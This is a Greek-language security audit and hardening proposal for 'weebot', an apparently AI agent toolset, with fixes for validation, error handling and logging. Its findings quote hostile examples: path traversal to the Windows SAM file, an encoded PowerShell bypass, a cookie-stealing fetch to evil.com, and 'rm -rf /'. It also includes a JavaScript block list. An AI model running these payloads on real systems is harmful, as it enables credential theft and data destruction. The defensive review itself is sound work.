# 🔒 Ασφάλεια και Error Handling - Πρόταση Αρχιτεκτονικής

## 📋 Περίληψη Αναφοράς Ασφαλείας

### Κρίσιμα Κενά Ασφαλείας που Εντοπίστηκαν

#### 🔴 CRITICAL: Path Traversal (Αρχείο: `tools/file_editor.py`)

**Πρόβλημα:** Το `StrReplaceEditorTool` δεν ελέγχει αν το path είναι εντός του επιτρεπτού workspace.

```python
# ΕΠΙΚΙΝΔΥΝΟ - Υπάρχον κώδικας
async def execute(self, command: str, path: str, **kwargs) -> ToolResult:
    p = Path(path)  # Κανένας έλεγχος!
    if command == "view":
        return self._view(p, kwargs.get("view_range"))
```

**Επίθεση:**
```bash
# Ανάγνωση αρχείων συστήματος
view path="../../../../Windows/System32/config/SAM"
view path="C:/Windows/System32/drivers/etc/hosts"
```

#### 🔴 CRITICAL: Insecure Deserialization (Αρχείο: `state_manager.py:234`)

**Πρόβλημα:** Χρήση `pickle.loads()` σε δεδομένα από βάση δεδομένων.

```python
# ΕΠΙΚΙΝΔΥΝΟ
return pickle.loads(row[0])  # Remote Code Execution αν το DB compromised
```

#### 🔴 CRITICAL: Command Injection (Αρχείο: `tools/powershell_tool.py`)

**Πρόβλημα:** Regex-based validation μπορεί να παρακαμφθεί.

```powershell
# Bypass υπάρχοντος ελέγχου με encoding
powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==
powershell -EncodedCommand <base64_payload>
```

#### 🟠 HIGH: JavaScript Injection (Αρχείο: `tools/advanced_browser.py`)

**Πρόβλημα:** Άμεση εκτέλεση JavaScript χωρίς validation.

```javascript
// Μπορεί να κλέψει cookies, να κάνει requests σε άλλα domains
action="evaluate" script="fetch('https://evil.com/steal?data='+document.cookie)"
```

#### 🟠 HIGH: SQL Injection (Potential)

**Πρόβλημα:** FTS5 queries σε `kb_notes` virtual table μπορεί να είναι ευάλωτα αν το query περιέχει user input χωρίς sanitization.

#### 🟡 MEDIUM: Information Disclosure

**Πρόβλημα:** Τα error messages μπορεί να αποκαλύπτουν:
- File paths του συστήματος
- Internal structure του κώδικα
- API keys σε stack traces

---

## 🛡️ Προτεινόμενη Αρχιτεκτονική Ασφαλείας

### 1. Security Validators Layer

Το αρχείο `weebot/security_validators.py` παρέχει:

#### PathValidator
```python
from weebot.security_validators import PathValidator

validator = PathValidator()
report = validator.validate("../../../etc/passwd")
# Returns: ValidationReport(result=INVALID_PATH, message="...")

# Στην πράξη:
safe_path = validator.get_safe_path(user_input)  # Raises SecurityError αν invalid
```

**Χαρακτηριστικά:**
- ✅ Path normalization και resolution
- ✅ Workspace boundary enforcement
- ✅ Encoded traversal detection (URL, Base64, Hex)
- ✅ Null byte injection protection
- ✅ System path blocking

#### CommandValidator
```python
from weebot.security_validators import CommandValidator

validator = CommandValidator()

# PowerShell validation
report = validator.validate_powershell("Invoke-Expression ...")

# Python validation  
report = validator.validate_python("import os; os.system('rm -rf /')")
```

**Χαρακτηριστικά:**
- ✅ Block encoded commands (-enc, -EncodedCommand)
- ✅ Dangerous cmdlet detection
- ✅ Dynamic import detection
- ✅ Fork bomb prevention

#### InputSanitizer
```python
from weebot.security_validators import InputSanitizer

# Για logging
safe_value = InputSanitizer.sanitize_for_logs(user_input)

# API key masking
masked = InputSanitizer.sanitize_api_key("sk-abc123xyz789")
# Returns: "sk-a...z789"
```

### 2. Error Handling System

#### Βασική Χρήση

```python
from weebot.error_system_base import WeebotError, ErrorCode, ErrorSeverity

# Δημιουργία structured error
error = WeebotError(
    message="Database connection failed",
    code=ErrorCode.SERVICE_UNAVAILABLE,
    severity=ErrorSeverity.CRITICAL,
    remediation="Check database service status",
    details={"host": "localhost", "port": 5432}
)

# Αυτόματο context capture
print(error.context.error_id)      # "a1b2c3d4"
print(error.context.source_file)   # "module.py"
print(error.context.line_number)   # 42
```

#### User-Facing Messages

```python
from weebot.error_system_user_messages import get_user_message

# Για end users (production)
msg = get_user_message(error, is_developer=False)
# Output: "Service unavailable. Please try again. Reference: a1b2c3d4"

# Για developers
msg = get_user_message(error, is_developer=True)
# Output: Full stack trace + details
```

#### Decorators για Automatic Error Handling

```python
from weebot.error_system_handler import handle_errors, handle_async_errors

@handle_errors(operation="file read", reraise=False, default_return=None)
def read_config(path: str) -> dict | None:
    return json.loads(Path(path).read_text())

@handle_async_errors(operation="API call", reraise=True)
async def fetch_data(url: str) -> dict:
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            return await resp.json()
```

#### Error Aggregation

```python
from weebot.error_system_handler import ErrorAggregator

with ErrorAggregator("batch processing") as agg:
    for file in files:
        with agg.catch(item_identifier=file.name):
            process_file(file)

if agg.has_errors:
    raise agg.to_exception()
```

### 3. Structured Logging

```python
from weebot.structured_logger import (
    StructuredLogger, 
    LogConfig, 
    configure_logging,
    LogContext
)

# Configuration
configure_logging(environment="production", log_level="INFO")

# Ή λεπτομερής configuration
config = LogConfig(
    environment="production",
    log_level="INFO",
    enable_json=True,
    sensitive_keys={'password', 'api_key', 'token'}
)
logger = StructuredLogger(config)

# Contextual logging
with LogContext(request_id="abc123", user_id="user456"):
    log = logger.get_logger("weebot.api")
    log.info("Processing request")  # Περιλαμβάνει request_id, user_id

# JSON output σε production
# {"timestamp": "2026-03-03T10:30:00Z", "level": "INFO", 
#  "message": "Processing request", "request_id": "abc123", ...}
```

---

## 📝 Οδηγίες Εφαρμογής

### Βήμα 1: Ενίσχυση File Editor

```python
# weebot/tools/file_editor.py

from weebot.security_validators import PathValidator
from weebot.error_system_base import WeebotError, ErrorCode

class StrReplaceEditorTool(BaseTool):
    def __init__(self):
        self._path_validator = PathValidator()
    
    async def execute(self, command: str, path: str, **kwargs) -> ToolResult:
        try:
            # Επικύρωση path
            safe_path = self._path_validator.get_safe_path(path)
        except SecurityError as e:
            return ToolResult(
                output="",
                error=f"Access denied: {e.message}"
            )
        
        # Συνέχεια με safe_path...
```

### Βήμα 2: Ενίσχυση PowerShell/Bash Tools

```python
# weebot/tools/powershell_tool.py

from weebot.security_validators import CommandValidator

class PowerShellTool:
    def __init__(self):
        self._validator = CommandValidator()
    
    def _run(self, command: str) -> str:
        # Επικύρωση εντολής
        report = self._validator.validate_powershell(command)
        if report.result != ValidationResult.VALID:
            return f"Error: Command blocked - {report.message}"
        
        # Συνέχεια εκτέλεσης...
```

### Βήμα 3: Αντικατάσταση Pickle

```python
# weebot/state_manager.py

import json
from dataclasses import asdict

class StateManager:
    def save_state(self, state: ProjectState) -> None:
        # Αντί για pickle.dumps, χρησιμοποιούμε JSON
        state_dict = {
            "project_id": state.project_id,
            "status": state.status.value,
            "created_at": state.created_at.isoformat(),
            # ... όλα τα fields
        }
        serialized = json.dumps(state_dict).encode('utf-8')
        
        self._conn.execute(
            "INSERT OR REPLACE INTO projects (project_id, state, updated_at) "
            "VALUES (?, ?, ?)",
            (state.project_id, serialized, state.updated_at),
        )
    
    def load_state(self, project_id: str) -> Optional[ProjectState]:
        cursor = self._conn.execute(
            "SELECT state FROM projects WHERE project_id = ?",
            (project_id,),
        )
        row = cursor.fetchone()
        if row:
            state_dict = json.loads(row[0].decode('utf-8'))
            return ProjectState(
                project_id=state_dict["project_id"],
                status=ProjectStatus(state_dict["status"]),
                created_at=datetime.fromisoformat(state_dict["created_at"]),
                # ...
            )
        return None
```

### Βήμα 4: Global Error Handler

```python
# weebot/__init__.py ή main entry point

from weebot.error_system_handler import set_error_handler, ErrorHandler
from weebot.structured_logger import configure_logging

# Setup logging
configure_logging(environment="production")

# Setup error handling
error_handler = ErrorHandler(
    log_full_stacktraces=True,
    notify_on_severity={ErrorSeverity.ERROR, ErrorSeverity.CRITICAL}
)
set_error_handler(error_handler)
```

### Βήμα 5: Browser Tool Security

```python
# weebot/tools/advanced_browser.py

from weebot.security_validators import InputSanitizer

class AdvancedBrowserTool(BaseTool):
    ALLOWED_DOMAINS = ['localhost', '127.0.0.1']  # Restrict for safety
    
    async def execute(self, action: str, url: Optional[str] = None, 
                      script: Optional[str] = None, **kwargs) -> ToolResult:
        
        # Validate URL
        if url:
            parsed = urlparse(url)
            if parsed.netloc not in self.ALLOWED_DOMAINS:
                return ToolResult(
                    output="",
                    error=f"URL not in allowed domains: {url}"
                )
        
        # Validate JavaScript
        if action == "evaluate" and script:
            # Block dangerous patterns
            dangerous = ['fetch', 'XMLHttpRequest', 'WebSocket', 'eval']
            for pattern in dangerous:
                if pattern in script:
                    return ToolResult(
                        output="",
                        error=f"JavaScript contains blocked pattern: {pattern}"
                    )
        
        # Συνέχεια...
```

---

## 📊 Error Code Reference

| Code | Name | Severity | Category |
|------|------|----------|----------|
| E1000 | UNKNOWN_ERROR | ERROR | System |
| E1003 | TIMEOUT_ERROR | ERROR | System |
| E2000 | VALIDATION_ERROR | WARNING | Input |
| E2001 | INVALID_INPUT | WARNING | Input |
| E3000 | SECURITY_VIOLATION | WARNING | Security |
| E3002 | INJECTION_DETECTED | CRITICAL | Security |
| E3003 | PATH_TRAVERSAL_BLOCKED | WARNING | Security |
| E4000 | RESOURCE_NOT_FOUND | WARNING | Resource |
| E5000 | API_ERROR | ERROR | External |
| E5001 | NETWORK_ERROR | ERROR | External |
| E6000 | TOOL_EXECUTION_FAILED | ERROR | Tool |

---

## 🎯 Production Checklist

- [ ] Replace all `pickle` usage with JSON serialization
- [ ] Add PathValidator σε όλα τα file operations
- [ ] Add CommandValidator σε όλα τα shell executions
- [ ] Configure structured logging με JSON format
- [ ] Add sensitive data masking στα logs
- [ ] Implement rate limiting για tool execution
- [ ] Add correlation IDs σε όλα τα requests
- [ ] Setup error alerting για CRITICAL errors
- [ ] Review όλα τα error messages για information disclosure
- [ ] Add request signing για MCP server
- [ ] Implement session timeouts
- [ ] Add audit logging για security events

---

## 🔧 Migration Guide

### Από το παλιό σύστημα στο καινούριο:

```python
# ΠΑΛΙΟΣ ΤΡΟΠΟΣ
try:
    result = tool.execute(**params)
except Exception as e:
    logger.error(f"Error: {e}")
    return {"error": str(e)}

# ΝΕΟΣ ΤΡΟΠΟΣ
from weebot.error_system_handler import handle_async_errors
from weebot.structured_logger import get_logger

logger = get_logger("weebot.tools")

@handle_async_errors(operation="tool execution", reraise=False)
async def execute_tool(tool, params):
    with LogContext(tool_name=tool.name, params=params):
        logger.info("Executing tool")
        result = await tool.execute(**params)
        logger.info("Tool execution completed")
        return result
```

---

## 📈 Monitoring & Alerting

```python
# Integration με notification system
from weebot.notifications import NotificationManager

class MonitoredErrorHandler(ErrorHandler):
    def __init__(self, notifier: NotificationManager, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.notifier = notifier
    
    def _notify_error(self, error: WeebotError) -> None:
        super()._notify_error(error)
        
        if error.severity == ErrorSeverity.CRITICAL:
            asyncio.create_task(self.notifier.notify_error(
                project_id="system",
                error=f"CRITICAL: {error.message} [{error.context.error_id}]",
                critical=True
            ))
```

---

## 📚 Files Created

1. `weebot/security_validators.py` - Security validation layer
2. `weebot/error_system_base.py` - Base error classes
3. `weebot/error_system_handler.py` - Centralized error handling
4. `weebot/error_system_user_messages.py` - User-friendly messages
5. `weebot/structured_logger.py` - Production logging

---

## ✅ Summary

Αυτή η πρόταση παρέχει:

1. **Defense in Depth** - Πολλαπλά επίπεδα validation
2. **Fail Safe** - Default deny για άγνωστα inputs
3. **Audit Trail** - Πλήρη logging με context
4. **User Safety** - Σαφή feedback χωρίς information leakage
5. **Developer Experience** - Rich debugging info σε development mode
6. **Production Ready** - Structured JSON logs, rotation, masking
